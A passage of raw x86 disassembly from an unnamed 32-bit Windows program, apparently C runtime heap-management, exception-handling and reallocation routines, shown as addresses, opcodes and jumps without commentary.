  4251ba:	cmp    ebx,DWORD PTR [edi+0x8]
  4251bd:	jne    0x425202
  4251bf:	cmp    ecx,0x20
  4251c2:	mov    ebx,0x80000000
  4251c7:	jae    0x4251e3
  4251c9:	shr    ebx,cl
  4251cb:	mov    ecx,DWORD PTR [ebp-0x8]
  4251ce:	lea    ecx,[ecx+eax*1+0x4]
  4251d2:	not    ebx
  4251d4:	and    DWORD PTR [eax+edx*4+0x44],ebx
  4251d8:	dec    BYTE PTR [ecx]
  4251da:	jne    0x425202
  4251dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251df:	and    DWORD PTR [ecx],ebx
  4251e1:	jmp    0x425202
  4251e3:	add    ecx,0xffffffe0
  4251e6:	shr    ebx,cl
  4251e8:	mov    ecx,DWORD PTR [ebp-0x8]
  4251eb:	lea    ecx,[ecx+eax*1+0x4]
  4251ef:	not    ebx
  4251f1:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  4251f8:	dec    BYTE PTR [ecx]
  4251fa:	jne    0x425202
  4251fc:	mov    ecx,DWORD PTR [ebp+0x8]
  4251ff:	and    DWORD PTR [ecx+0x4],ebx
  425202:	mov    ecx,DWORD PTR [edi+0x8]
  425205:	mov    ebx,DWORD PTR [edi+0x4]
  425208:	mov    DWORD PTR [ecx+0x4],ebx
  42520b:	mov    ecx,DWORD PTR [edi+0x4]
  42520e:	mov    edi,DWORD PTR [edi+0x8]
  425211:	mov    DWORD PTR [ecx+0x8],edi
  425214:	mov    ecx,DWORD PTR [ebp+0x10]
  425217:	sub    ecx,esi
  425219:	add    DWORD PTR [ebp-0x4],ecx
  42521c:	cmp    DWORD PTR [ebp-0x4],0x0
  425220:	jle    0x4252cb
  425226:	mov    edi,DWORD PTR [ebp-0x4]
  425229:	mov    ecx,DWORD PTR [ebp+0xc]
  42522c:	sar    edi,0x4
  42522f:	dec    edi
  425230:	cmp    edi,0x3f
  425233:	lea    ecx,[ecx+esi*1-0x4]
  425237:	jbe    0x42523c
  425239:	push   0x3f
  42523b:	pop    edi
  42523c:	mov    ebx,DWORD PTR [ebp-0xc]
  42523f:	lea    ebx,[ebx+edi*8]
  425242:	mov    DWORD PTR [ebp+0x10],ebx
  425245:	mov    ebx,DWORD PTR [ebx+0x4]
  425248:	mov    DWORD PTR [ecx+0x4],ebx
  42524b:	mov    ebx,DWORD PTR [ebp+0x10]
  42524e:	mov    DWORD PTR [ecx+0x8],ebx
  425251:	mov    DWORD PTR [ebx+0x4],ecx
  425254:	mov    ebx,DWORD PTR [ecx+0x4]
  425257:	mov    DWORD PTR [ebx+0x8],ecx
  42525a:	mov    ebx,DWORD PTR [ecx+0x4]
  42525d:	cmp    ebx,DWORD PTR [ecx+0x8]
  425260:	jne    0x4252b9
  425262:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  425266:	mov    BYTE PTR [ebp+0x13],cl
  425269:	inc    cl
  42526b:	cmp    edi,0x20
  42526e:	mov    BYTE PTR [edi+eax*1+0x4],cl
  425272:	jae    0x425290
  425274:	cmp    BYTE PTR [ebp+0x13],0x0
  425278:	jne    0x425288
  42527a:	mov    ecx,edi
  42527c:	mov    ebx,0x80000000
  425281:	shr    ebx,cl
  425283:	mov    ecx,DWORD PTR [ebp+0x8]
  425286:	or     DWORD PTR [ecx],ebx
  425288:	lea    eax,[eax+edx*4+0x44]
  42528c:	mov    ecx,edi
  42528e:	jmp    0x4252b0
  425290:	cmp    BYTE PTR [ebp+0x13],0x0
  425294:	jne    0x4252a6
  425296:	lea    ecx,[edi-0x20]
  425299:	mov    ebx,0x80000000
  42529e:	shr    ebx,cl
  4252a0:	mov    ecx,DWORD PTR [ebp+0x8]
  4252a3:	or     DWORD PTR [ecx+0x4],ebx
  4252a6:	lea    eax,[eax+edx*4+0xc4]
  4252ad:	lea    ecx,[edi-0x20]
  4252b0:	mov    edx,0x80000000
  4252b5:	shr    edx,cl
  4252b7:	or     DWORD PTR [eax],edx
  4252b9:	mov    edx,DWORD PTR [ebp+0xc]
  4252bc:	mov    ecx,DWORD PTR [ebp-0x4]
  4252bf:	lea    eax,[edx+esi*1-0x4]
  4252c3:	mov    DWORD PTR [eax],ecx
  4252c5:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  4252c9:	jmp    0x4252ce
  4252cb:	mov    edx,DWORD PTR [ebp+0xc]
  4252ce:	lea    eax,[esi+0x1]
  4252d1:	mov    DWORD PTR [edx-0x4],eax
  4252d4:	mov    DWORD PTR [edx+esi*1-0x8],eax
  4252d8:	jmp    0x425419
  4252dd:	xor    eax,eax
  4252df:	jmp    0x42541c
  4252e4:	jge    0x425419
  4252ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4252ed:	sub    DWORD PTR [ebp+0x10],esi
  4252f0:	lea    ecx,[esi+0x1]
  4252f3:	mov    DWORD PTR [ebx-0x4],ecx
  4252f6:	lea    ebx,[ebx+esi*1-0x4]
  4252fa:	mov    esi,DWORD PTR [ebp+0x10]
  4252fd:	sar    esi,0x4
  425300:	dec    esi
  425301:	cmp    esi,0x3f
  425304:	mov    DWORD PTR [ebp+0xc],ebx
  425307:	mov    DWORD PTR [ebx-0x4],ecx
  42530a:	jbe    0x42530f
  42530c:	push   0x3f
  42530e:	pop    esi
  42530f:	test   BYTE PTR [ebp-0x4],0x1
  425313:	jne    0x425399
  425319:	mov    esi,DWORD PTR [ebp-0x4]
  42531c:	sar    esi,0x4
  42531f:	dec    esi
  425320:	cmp    esi,0x3f
  425323:	jbe    0x425328
  425325:	push   0x3f
  425327:	pop    esi
  425328:	mov    ecx,DWORD PTR [edi+0x4]
  42532b:	cmp    ecx,DWORD PTR [edi+0x8]
  42532e:	jne    0x425372
  425330:	cmp    esi,0x20
  425333:	mov    ebx,0x80000000
  425338:	jae    0x425353
  42533a:	mov    ecx,esi
  42533c:	shr    ebx,cl
  42533e:	lea    esi,[esi+eax*1+0x4]
  425342:	not    ebx
  425344:	and    DWORD PTR [eax+edx*4+0x44],ebx
  425348:	dec    BYTE PTR [esi]
  42534a:	jne    0x42536f
  42534c:	mov    ecx,DWORD PTR [ebp+0x8]
  42534f:	and    DWORD PTR [ecx],ebx
  425351:	jmp    0x42536f
  425353:	lea    ecx,[esi-0x20]
  425356:	shr    ebx,cl
  425358:	lea    ecx,[esi+eax*1+0x4]
  42535c:	not    ebx
  42535e:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  425365:	dec    BYTE PTR [ecx]
  425367:	jne    0x42536f
  425369:	mov    ecx,DWORD PTR [ebp+0x8]
  42536c:	and    DWORD PTR [ecx+0x4],ebx
  42536f:	mov    ebx,DWORD PTR [ebp+0xc]
  425372:	mov    ecx,DWORD PTR [edi+0x8]
  425375:	mov    esi,DWORD PTR [edi+0x4]
  425378:	mov    DWORD PTR [ecx+0x4],esi
  42537b:	mov    esi,DWORD PTR [edi+0x8]
  42537e:	mov    ecx,DWORD PTR [edi+0x4]
  425381:	mov    DWORD PTR [ecx+0x8],esi
  425384:	mov    esi,DWORD PTR [ebp+0x10]
  425387:	add    esi,DWORD PTR [ebp-0x4]
  42538a:	mov    DWORD PTR [ebp+0x10],esi
  42538d:	sar    esi,0x4
  425390:	dec    esi
  425391:	cmp    esi,0x3f
  425394:	jbe    0x425399
  425396:	push   0x3f
  425398:	pop    esi
  425399:	mov    ecx,DWORD PTR [ebp-0xc]
  42539c:	lea    ecx,[ecx+esi*8]
  42539f:	mov    edi,DWORD PTR [ecx+0x4]
  4253a2:	mov    DWORD PTR [ebx+0x8],ecx
  4253a5:	mov    DWORD PTR [ebx+0x4],edi
  4253a8:	mov    DWORD PTR [ecx+0x4],ebx
  4253ab:	mov    ecx,DWORD PTR [ebx+0x4]
  4253ae:	mov    DWORD PTR [ecx+0x8],ebx
  4253b1:	mov    ecx,DWORD PTR [ebx+0x4]
  4253b4:	cmp    ecx,DWORD PTR [ebx+0x8]
  4253b7:	jne    0x425410
  4253b9:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  4253bd:	mov    BYTE PTR [ebp+0xf],cl
  4253c0:	inc    cl
  4253c2:	cmp    esi,0x20
  4253c5:	mov    BYTE PTR [esi+eax*1+0x4],cl
  4253c9:	jae    0x4253e7
  4253cb:	cmp    BYTE PTR [ebp+0xf],0x0
  4253cf:	jne    0x4253df
  4253d1:	mov    ecx,esi
  4253d3:	mov    edi,0x80000000
  4253d8:	shr    edi,cl
  4253da:	mov    ecx,DWORD PTR [ebp+0x8]
  4253dd:	or     DWORD PTR [ecx],edi
  4253df:	lea    eax,[eax+edx*4+0x44]
  4253e3:	mov    ecx,esi
  4253e5:	jmp    0x425407
  4253e7:	cmp    BYTE PTR [ebp+0xf],0x0
  4253eb:	jne    0x4253fd
  4253ed:	lea    ecx,[esi-0x20]
  4253f0:	mov    edi,0x80000000
  4253f5:	shr    edi,cl
  4253f7:	mov    ecx,DWORD PTR [ebp+0x8]
  4253fa:	or     DWORD PTR [ecx+0x4],edi
  4253fd:	lea    eax,[eax+edx*4+0xc4]
  425404:	lea    ecx,[esi-0x20]
  425407:	mov    edx,0x80000000
  42540c:	shr    edx,cl
  42540e:	or     DWORD PTR [eax],edx
  425410:	mov    eax,DWORD PTR [ebp+0x10]
  425413:	mov    DWORD PTR [ebx],eax
  425415:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  425419:	xor    eax,eax
  42541b:	inc    eax
  42541c:	pop    edi
  42541d:	pop    esi
  42541e:	pop    ebx
  42541f:	leave  
  425420:	ret    
  425421:	push   ebp
  425422:	mov    ebp,esp
  425424:	sub    esp,0x14
  425427:	mov    ecx,DWORD PTR [ebp+0x8]
  42542a:	mov    eax,ds:0x45cefc
  42542f:	mov    edx,DWORD PTR ds:0x45cf00
  425435:	add    ecx,0x17
  425438:	and    ecx,0xfffffff0
  42543b:	push   ebx
  42543c:	mov    DWORD PTR [ebp-0x10],ecx
  42543f:	sar    ecx,0x4
  425442:	push   esi
  425443:	lea    eax,[eax+eax*4]
  425446:	push   edi
  425447:	dec    ecx
  425448:	cmp    ecx,0x20
  42544b:	lea    edi,[edx+eax*4]
  42544e:	mov    DWORD PTR [ebp-0x4],edi
  425451:	jge    0x42545e
  425453:	or     esi,0xffffffff
  425456:	shr    esi,cl
  425458:	or     DWORD PTR [ebp-0x8],0xffffffff
  42545c:	jmp    0x42546b
  42545e:	add    ecx,0xffffffe0
  425461:	or     eax,0xffffffff
  425464:	xor    esi,esi
  425466:	shr    eax,cl
  425468:	mov    DWORD PTR [ebp-0x8],eax
  42546b:	mov    eax,ds:0x45cf08
  425470:	mov    ebx,eax
  425472:	mov    DWORD PTR [ebp-0xc],esi
  425475:	cmp    ebx,edi
  425477:	jmp    0x42548d
  425479:	mov    ecx,DWORD PTR [ebx+0x4]
  42547c:	mov    edi,DWORD PTR [ebx]
  42547e:	and    ecx,DWORD PTR [ebp-0x8]
  425481:	and    edi,esi
  425483:	or     ecx,edi
  425485:	jne    0x425492
  425487:	add    ebx,0x14
  42548a:	cmp    ebx,DWORD PTR [ebp-0x4]
  42548d:	mov    DWORD PTR [ebp+0x8],ebx
  425490:	jb     0x425479
  425492:	cmp    ebx,DWORD PTR [ebp-0x4]
  425495:	jne    0x4254bb
  425497:	mov    ebx,edx
  425499:	jmp    0x4254ac
  42549b:	mov    ecx,DWORD PTR [ebx+0x4]
  42549e:	mov    edi,DWORD PTR [ebx]
  4254a0:	and    ecx,DWORD PTR [ebp-0x8]
  4254a3:	and    edi,esi
  4254a5:	or     ecx,edi
  4254a7:	jne    0x4254b3
  4254a9:	add    ebx,0x14
  4254ac:	cmp    ebx,eax
  4254ae:	mov    DWORD PTR [ebp+0x8],ebx
  4254b1:	jb     0x42549b
  4254b3:	cmp    ebx,eax
  4254b5:	je     0x42554f
  4254bb:	mov    DWORD PTR ds:0x45cf08,ebx
  4254c1:	mov    eax,DWORD PTR [ebx+0x10]
  4254c4:	mov    edx,DWORD PTR [eax]
  4254c6:	cmp    edx,0xffffffff
  4254c9:	mov    DWORD PTR [ebp-0x4],edx
  4254cc:	je     0x4254e2
  4254ce:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  4254d5:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  4254d9:	and    ecx,DWORD PTR [ebp-0x8]
  4254dc:	and    edi,esi
  4254de:	or     ecx,edi
  4254e0:	jne    0x425518
  4254e2:	mov    edx,DWORD PTR [eax+0xc4]
  4254e8:	and    edx,DWORD PTR [ebp-0x8]
  4254eb:	and    DWORD PTR [ebp-0x4],0x0
  4254ef:	lea    ecx,[eax+0x44]
  4254f2:	mov    esi,DWORD PTR [ecx]
  4254f4:	and    esi,DWORD PTR [ebp-0xc]
  4254f7:	or     edx,esi
  4254f9:	mov    esi,DWORD PTR [ebp-0xc]
  4254fc:	jne    0x425515
  4254fe:	mov    edx,DWORD PTR [ecx+0x84]
  425504:	and    edx,DWORD PTR [ebp-0x8]
  425507:	inc    DWORD PTR [ebp-0x4]
  42550a:	add    ecx,0x4
  42550d:	mov    edi,DWORD PTR [ecx]
  42550f:	and    edi,esi
  425511:	or     edx,edi
  425513:	je     0x4254fe
  425515:	mov    edx,DWORD PTR [ebp-0x4]
  425518:	mov    ecx,edx
  42551a:	imul   ecx,ecx,0x204
  425520:	lea    ecx,[ecx+eax*1+0x144]
  425527:	mov    DWORD PTR [ebp-0xc],ecx
  42552a:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  42552e:	xor    edi,edi
  425530:	and    ecx,esi
  425532:	jne    0x4255a1
  425534:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  42553b:	and    ecx,DWORD PTR [ebp-0x8]
  42553e:	push   0x20
  425540:	pop    edi
  425541:	jmp    0x4255a1
  425543:	cmp    DWORD PTR [ebx+0x8],0x0
  425547:	jne    0x425554
  425549:	add    ebx,0x14
  42554c:	mov    DWORD PTR [ebp+0x8],ebx
  42554f:	cmp    ebx,DWORD PTR [ebp-0x4]
  425552:	jb     0x425543
  425554:	cmp    ebx,DWORD PTR [ebp-0x4]
  425557:	jne    0x42557f
  425559:	mov    ebx,edx
  42555b:	jmp    0x425566
  42555d:	cmp    DWORD PTR [ebx+0x8],0x0
  425561:	jne    0x42556d
  425563:	add    ebx,0x14
  425566:	cmp    ebx,eax
  425568:	mov    DWORD PTR [ebp+0x8],ebx
  42556b:	jb     0x42555d
  42556d:	cmp    ebx,eax
  42556f:	jne    0x42557f
  425571:	call   0x424f85
  425576:	mov    ebx,eax
  425578:	test   ebx,ebx
  42557a:	mov    DWORD PTR [ebp+0x8],ebx
  42557d:	je     0x425597
  42557f:	push   ebx
  425580:	call   0x42503c
  425585:	pop    ecx
  425586:	mov    ecx,DWORD PTR [ebx+0x10]
  425589:	mov    DWORD PTR [ecx],eax
  42558b:	mov    eax,DWORD PTR [ebx+0x10]
  42558e:	cmp    DWORD PTR [eax],0xffffffff
  425591:	jne    0x4254bb
  425597:	xor    eax,eax
  425599:	jmp    0x425718
  42559e:	shl    ecx,1
  4255a0:	inc    edi
  4255a1:	test   ecx,ecx
  4255a3:	jge    0x42559e
  4255a5:	mov    ecx,DWORD PTR [ebp-0xc]
  4255a8:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  4255ac:	mov    ecx,DWORD PTR [edx]
  4255ae:	sub    ecx,DWORD PTR [ebp-0x10]
  4255b1:	mov    esi,ecx
  4255b3:	sar    esi,0x4
  4255b6:	dec    esi
  4255b7:	cmp    esi,0x3f
  4255ba:	mov    DWORD PTR [ebp-0x8],ecx
  4255bd:	jle    0x4255c2
  4255bf:	push   0x3f
  4255c1:	pop    esi
  4255c2:	cmp    esi,edi
  4255c4:	je     0x4256cb
  4255ca:	mov    ecx,DWORD PTR [edx+0x4]
  4255cd:	cmp    ecx,DWORD PTR [edx+0x8]
  4255d0:	jne    0x42562e
  4255d2:	cmp    edi,0x20
  4255d5:	mov    ebx,0x80000000
  4255da:	jge    0x425602
  4255dc:	mov    ecx,edi
  4255de:	shr    ebx,cl
  4255e0:	mov    ecx,DWORD PTR [ebp-0x4]
  4255e3:	lea    edi,[eax+edi*1+0x4]
  4255e7:	not    ebx
  4255e9:	mov    DWORD PTR [ebp-0x14],ebx
  4255ec:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4255f0:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4255f4:	dec    BYTE PTR [edi]
  4255f6:	jne    0x42562b
  4255f8:	mov    ecx,DWORD PTR [ebp-0x14]
  4255fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4255fe:	and    DWORD PTR [ebx],ecx
  425600:	jmp    0x42562e
  425602:	lea    ecx,[edi-0x20]
  425605:	shr    ebx,cl
  425607:	mov    ecx,DWORD PTR [ebp-0x4]
  42560a:	lea    ecx,[eax+ecx*4+0xc4]
  425611:	lea    edi,[eax+edi*1+0x4]
  425615:	not    ebx
  425617:	and    DWORD PTR [ecx],ebx
  425619:	dec    BYTE PTR [edi]
  42561b:	mov    DWORD PTR [ebp-0x14],ebx
  42561e:	jne    0x42562b
  425620:	mov    ebx,DWORD PTR [ebp+0x8]
  425623:	mov    ecx,DWORD PTR [ebp-0x14]
  425626:	and    DWORD PTR [ebx+0x4],ecx
  425629:	jmp    0x42562e
  42562b:	mov    ebx,DWORD PTR [ebp+0x8]
  42562e:	cmp    DWORD PTR [ebp-0x8],0x0
  425632:	mov    ecx,DWORD PTR [edx+0x8]
  425635:	mov    edi,DWORD PTR [edx+0x4]
  425638:	mov    DWORD PTR [ecx+0x4],edi
  42563b:	mov    ecx,DWORD PTR [edx+0x4]
  42563e:	mov    edi,DWORD PTR [edx+0x8]
  425641:	mov    DWORD PTR [ecx+0x8],edi
  425644:	je     0x4256d7
  42564a:	mov    ecx,DWORD PTR [ebp-0xc]
  42564d:	lea    ecx,[ecx+esi*8]
  425650:	mov    edi,DWORD PTR [ecx+0x4]
  425653:	mov    DWORD PTR [edx+0x8],ecx
  425656:	mov    DWORD PTR [edx+0x4],edi
  425659:	mov    DWORD PTR [ecx+0x4],edx
  42565c:	mov    ecx,DWORD PTR [edx+0x4]
  42565f:	mov    DWORD PTR [ecx+0x8],edx
  425662:	mov    ecx,DWORD PTR [edx+0x4]
  425665:	cmp    ecx,DWORD PTR [edx+0x8]
  425668:	jne    0x4256c8
  42566a:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  42566e:	mov    BYTE PTR [ebp+0xb],cl
  425671:	inc    cl
  425673:	cmp    esi,0x20
  425676:	mov    BYTE PTR [esi+eax*1+0x4],cl
  42567a:	jge    0x42569f
  42567c:	cmp    BYTE PTR [ebp+0xb],0x0
  425680:	jne    0x42568d
  425682:	mov    edi,0x80000000
  425687:	mov    ecx,esi
  425689:	shr    edi,cl
  42568b:	or     DWORD PTR [ebx],edi
  42568d:	mov    ecx,esi
  42568f:	mov    edi,0x80000000
  425694:	shr    edi,cl
  425696:	mov    ecx,DWORD PTR [ebp-0x4]
  425699:	or     DWORD PTR [eax+ecx*4+0x44],edi
  42569d:	jmp    0x4256c8
  42569f:	cmp    BYTE PTR [ebp+0xb],0x0
  4256a3:	jne    0x4256b2
  4256a5:	lea    ecx,[esi-0x20]
  4256a8:	mov    edi,0x80000000
  4256ad:	shr    edi,cl
  4256af:	or     DWORD PTR [ebx+0x4],edi
  4256b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4256b5:	lea    edi,[eax+ecx*4+0xc4]
  4256bc:	lea    ecx,[esi-0x20]
  4256bf:	mov    esi,0x80000000
  4256c4:	shr    esi,cl
  4256c6:	or     DWORD PTR [edi],esi
  4256c8:	mov    ecx,DWORD PTR [ebp-0x8]
  4256cb:	test   ecx,ecx
  4256cd:	je     0x4256da
  4256cf:	mov    DWORD PTR [edx],ecx
  4256d1:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4256d5:	jmp    0x4256da
  4256d7:	mov    ecx,DWORD PTR [ebp-0x8]
  4256da:	mov    esi,DWORD PTR [ebp-0x10]
  4256dd:	add    edx,ecx
  4256df:	lea    ecx,[esi+0x1]
  4256e2:	mov    DWORD PTR [edx],ecx
  4256e4:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4256e8:	mov    esi,DWORD PTR [ebp-0xc]
  4256eb:	mov    ecx,DWORD PTR [esi]
  4256ed:	test   ecx,ecx
  4256ef:	lea    edi,[ecx+0x1]
  4256f2:	mov    DWORD PTR [esi],edi
  4256f4:	jne    0x425710
  4256f6:	cmp    ebx,DWORD PTR ds:0x45cef8
  4256fc:	jne    0x425710
  4256fe:	mov    ecx,DWORD PTR [ebp-0x4]
  425701:	cmp    ecx,DWORD PTR ds:0x45cf10
  425707:	jne    0x425710
  425709:	and    DWORD PTR ds:0x45cef8,0x0
  425710:	mov    ecx,DWORD PTR [ebp-0x4]
  425713:	mov    DWORD PTR [eax],ecx
  425715:	lea    eax,[edx+0x4]
  425718:	pop    edi
  425719:	pop    esi
  42571a:	pop    ebx
  42571b:	leave  
  42571c:	ret    
  42571d:	int3   
  42571e:	int3   
  42571f:	int3   
  425720:	push   esi
  425721:	inc    ebx
  425722:	xor    dh,BYTE PTR [eax]
  425724:	pop    eax
  425725:	inc    ebx
  425726:	xor    BYTE PTR [eax],dh
  425728:	push   ebp
  425729:	mov    ebp,esp
  42572b:	sub    esp,0x8
  42572e:	push   ebx
  42572f:	push   esi
  425730:	push   edi
  425731:	push   ebp
  425732:	cld    
  425733:	mov    ebx,DWORD PTR [ebp+0xc]
  425736:	mov    eax,DWORD PTR [ebp+0x8]
  425739:	test   DWORD PTR [eax+0x4],0x6
  425740:	jne    0x4257c8
  425746:	mov    DWORD PTR [ebp-0x8],eax
  425749:	mov    eax,DWORD PTR [ebp+0x10]
  42574c:	mov    DWORD PTR [ebp-0x4],eax
  42574f:	lea    eax,[ebp-0x8]
  425752:	mov    DWORD PTR [ebx-0x4],eax
  425755:	mov    esi,DWORD PTR [ebx+0xc]
  425758:	mov    edi,DWORD PTR [ebx+0x8]
  42575b:	cmp    esi,0xffffffff
  42575e:	je     0x4257c1
  425760:	lea    ecx,[esi+esi*2]
  425763:	cmp    DWORD PTR [edi+ecx*4+0x4],0x0
  425768:	je     0x4257af
  42576a:	push   esi
  42576b:	push   ebp
  42576c:	lea    ebp,[ebx+0x10]
  42576f:	call   DWORD PTR [edi+ecx*4+0x4]
  425773:	pop    ebp
  425774:	pop    esi
  425775:	mov    ebx,DWORD PTR [ebp+0xc]
  425778:	or     eax,eax
  42577a:	je     0x4257af
  42577c:	js     0x4257ba
  42577e:	mov    edi,DWORD PTR [ebx+0x8]
  425781:	push   ebx
  425782:	call   0x4266b0
  425787:	add    esp,0x4
  42578a:	lea    ebp,[ebx+0x10]
  42578d:	push   esi
  42578e:	push   ebx
  42578f:	call   0x4266f2
  425794:	add    esp,0x8
  425797:	lea    ecx,[esi+esi*2]
  42579a:	push   0x1
  42579c:	mov    eax,DWORD PTR [edi+ecx*4+0x8]
  4257a0:	call   0x426786
  4257a5:	mov    eax,DWORD PTR [edi+ecx*4]
  4257a8:	mov    DWORD PTR [ebx+0xc],eax
  4257ab:	call   DWORD PTR [edi+ecx*4+0x8]
  4257af:	mov    edi,DWORD PTR [ebx+0x8]
  4257b2:	lea    ecx,[esi+esi*2]
  4257b5:	mov    esi,DWORD PTR [edi+ecx*4]
  4257b8:	jmp    0x42575b
  4257ba:	mov    eax,0x0
  4257bf:	jmp    0x4257dd
  4257c1:	mov    eax,0x1
  4257c6:	jmp    0x4257dd
  4257c8:	push   ebp
  4257c9:	lea    ebp,[ebx+0x10]
  4257cc:	push   0xffffffff
  4257ce:	push   ebx
  4257cf:	call   0x4266f2
  4257d4:	add    esp,0x8
  4257d7:	pop    ebp
  4257d8:	mov    eax,0x1
  4257dd:	pop    ebp
  4257de:	pop    edi
  4257df:	pop    esi
  4257e0:	pop    ebx
  4257e1:	mov    esp,ebp
  4257e3:	pop    ebp
  4257e4:	ret    
  4257e5:	push   ebp
  4257e6:	mov    ecx,DWORD PTR [esp+0x8]
  4257ea:	mov    ebp,DWORD PTR [ecx]
  4257ec:	mov    eax,DWORD PTR [ecx+0x1c]
  4257ef:	push   eax
  4257f0:	mov    eax,DWORD PTR [ecx+0x18]
  4257f3:	push   eax
  4257f4:	call   0x4266f2
  4257f9:	add    esp,0x8
  4257fc:	pop    ebp
  4257fd:	ret    0x4
  425800:	call   0x42370d
  425805:	add    eax,0x8
  425808:	ret    
  425809:	push   0x14
  42580b:	push   0x428768
  425810:	call   0x423858
  425815:	mov    edi,DWORD PTR [ebp+0x8]
  425818:	xor    ebx,ebx
  42581a:	cmp    edi,ebx
  42581c:	jne    0x42582c
  42581e:	push   DWORD PTR [ebp+0xc]
  425821:	call   0x424582
  425826:	pop    ecx
  425827:	jmp    0x4259b0
  42582c:	mov    esi,DWORD PTR [ebp+0xc]
  42582f:	cmp    esi,ebx
  425831:	jne    0x42583f
  425833:	push   edi
  425834:	call   0x42446a
  425839:	pop    ecx
  42583a:	jmp    0x4259ae
  42583f:	cmp    DWORD PTR ds:0x45d144,0x3
  425846:	jne    0x42597a
  42584c:	mov    DWORD PTR [ebp-0x1c],ebx
  42584f:	cmp    esi,0xffffffe0
  425852:	ja     0x425949
  425858:	push   0x4
  42585a:	call   0x423a1f
  42585f:	pop    ecx
  425860:	mov    DWORD PTR [ebp-0x4],ebx
  425863:	push   edi
  425864:	call   0x424c42
  425869:	pop    ecx
  42586a:	mov    DWORD PTR [ebp-0x20],eax
  42586d:	cmp    eax,ebx
  42586f:	je     0x425919
  425875:	cmp    esi,DWORD PTR ds:0x45cf04
  42587b:	ja     0x4258c9
  42587d:	push   esi
  42587e:	push   edi
  42587f:	push   eax
  425880:	call   0x425142
  425885:	add    esp,0xc
  425888:	test   eax,eax
  42588a:	je     0x425891
  42588c:	mov    DWORD PTR [ebp-0x1c],edi
  42588f:	jmp    0x4258c9
  425891:	push   esi
  425892:	call   0x425421
  425897:	pop    ecx
  425898:	mov    DWORD PTR [ebp-0x1c],eax
  42589b:	cmp    eax,ebx
  42589d:	je     0x4258c9
  42589f:	mov    eax,DWORD PTR [edi-0x4]
  4258a2:	dec    eax
  4258a3:	mov    DWORD PTR [ebp-0x24],eax
  4258a6:	cmp    eax,esi
  4258a8:	jb     0x4258ac
  4258aa:	mov    eax,esi
  4258ac:	push   eax
  4258ad:	push   edi
  4258ae:	push   DWORD PTR [ebp-0x1c]
  4258b1:	call   0x4245a0
  4258b6:	push   edi
  4258b7:	call   0x424c42
  4258bc:	mov    DWORD PTR [ebp-0x20],eax
  4258bf:	push   edi
  4258c0:	push   eax
  4258c1:	call   0x424c6d
  4258c6:	add    esp,0x18
  4258c9:	cmp    DWORD PTR [ebp-0x1c],ebx
  4258cc:	jne    0x425919
  4258ce:	cmp    esi,ebx
  4258d0:	jne    0x4258d8
  4258d2:	xor    esi,esi
  4258d4:	inc    esi
  4258d5:	mov    DWORD PTR [ebp+0xc],esi
  4258d8:	add    esi,0xf
  4258db:	and    esi,0xfffffff0
  4258de:	mov    DWORD PTR [ebp+0xc],esi
  4258e1:	push   esi
  4258e2:	push   ebx
  4258e3:	push   DWORD PTR ds:0x45d140
  4258e9:	call   DWORD PTR ds:0x4280a4
  4258ef:	mov    DWORD PTR [ebp-0x1c],eax
  4258f2:	cmp    eax,ebx
  4258f4:	je     0x425919
  4258f6:	mov    eax,DWORD PTR [edi-0x4]
  4258f9:	dec    eax
  4258fa:	mov    DWORD PTR [ebp-0x24],eax
  4258fd:	cmp    eax,esi
  4258ff:	jb     0x425903
  425901:	mov    eax,esi
  425903:	push   eax
  425904:	push   edi
  425905:	push   DWORD PTR [ebp-0x1c]
  425908:	call   0x4245a0
  42590d:	push   edi
  42590e:	push   DWORD PTR [ebp-0x20]
  425911:	call   0x424c6d
  425916:	add    esp,0x14
  425919:	or     DWORD PTR [ebp-0x4],0xffffffff
  42591d:	call   0x425971
  425922:	cmp    DWORD PTR [ebp-0x20],ebx
  425925:	jne    0x425949
  425927:	cmp    esi,ebx
  425929:	jne    0x42592e
  42592b:	xor    esi,esi
  42592d:	inc    esi
  42592e:	add    esi,0xf
  425931:	and    esi,0xfffffff0
  425934:	mov    DWORD PTR [ebp+0xc],esi
  425937:	push   esi
  425938:	push   edi
  425939:	push   ebx
  42593a:	push   DWORD PTR ds:0x45d140
  425940:	call   DWORD PTR ds:0x4280b0
  425946:	mov    DWORD PTR [ebp-0x1c],eax
  425949:	mov    eax,DWORD PTR [ebp-0x1c]
  42594c:	cmp    eax,ebx
  42594e:	jne    0x4259b0
  425950:	cmp    DWORD PTR ds:0x45cdc8,ebx
  425956:	je     0x4259b0
  425958:	push   esi
  425959:	call   0x426142
  42595e:	pop    ecx
  42595f:	test   eax,eax
  425961:	jne    0x42584c
  425967:	jmp    0x4259ae
  425969:	xor    ebx,ebx
  42596b:	mov    esi,DWORD PTR [ebp+0xc]
  42596e:	mov    edi,DWORD PTR [ebp+0x8]
  425971:	push   0x4
  425973:	call   0x42398b
  425978:	pop    ecx
  425979:	ret    
  42597a:	xor    eax,eax
  42597c:	cmp    esi,0xffffffe0
  42597f:	ja     0x425997
  425981:	cmp    esi,ebx
  425983:	jne    0x425988
  425985:	xor    esi,esi
  425987:	inc    esi
  425988:	push   esi
  425989:	push   edi
  42598a:	push   ebx
  42598b:	push   DWORD PTR ds:0x45d140
  425991:	call   DWORD PTR ds:0x4280b0
  425997:	cmp    eax,ebx
  425999:	jne    0x4259b0
  42599b:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a1:	je     0x4259b0
  4259a3:	push   esi
  4259a4:	call   0x426142
  4259a9:	pop    ecx
  4259aa:	test   eax,eax
  4259ac:	jne    0x42597a
  4259ae:	xor    eax,eax
  4259b0:	call   0x423893
  4259b5:	ret    
